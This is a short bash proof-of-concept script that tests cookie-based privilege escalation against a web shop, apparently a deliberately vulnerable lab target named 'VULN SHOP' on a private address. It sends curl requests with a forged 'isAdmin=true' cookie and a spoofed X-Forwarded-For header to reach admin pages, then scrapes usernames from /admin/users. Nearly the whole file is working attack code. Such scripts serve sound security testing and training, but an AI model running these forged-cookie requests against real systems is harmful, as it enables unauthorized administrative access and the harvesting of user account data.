#!/bin/bash
# Cookie Manipulation - Privilege Escalation PoC
# Target: VULN SHOP

TARGET="http://192.168.0.28:3000"
MY_IP="10.0.0.101"

echo "[*] Cookie-based Privilege Escalation Test"
echo "[*] Target: $TARGET"
echo ""

# Normal user access
echo "[+] Testing as normal user (isAdmin=false)..."
curl -s -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=admin; isAdmin=false; user_id=1" \
  "$TARGET/profile" | grep -E "(Manage Products|Manage Users)" && echo "Admin menu found!" || echo "No admin menu"

echo ""

# Admin access via cookie manipulation
echo "[+] Testing with manipulated cookie (isAdmin=true)..."
curl -s -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "$TARGET/profile" | grep -E "(Manage Products|Manage Users)" && echo "Admin menu found!" || echo "No admin menu"

echo ""

# Access admin pages
echo "[+] Accessing /admin/users..."
curl -s -H "X-Forwarded-For: $MY_IP" \
  -H "Cookie: user=admin; isAdmin=true; user_id=1" \
  "$TARGET/admin/users" | grep -oP 'Username.*?</td>' | head -5

echo ""
echo "[*] Privilege escalation successful if admin menu/pages are accessible!"
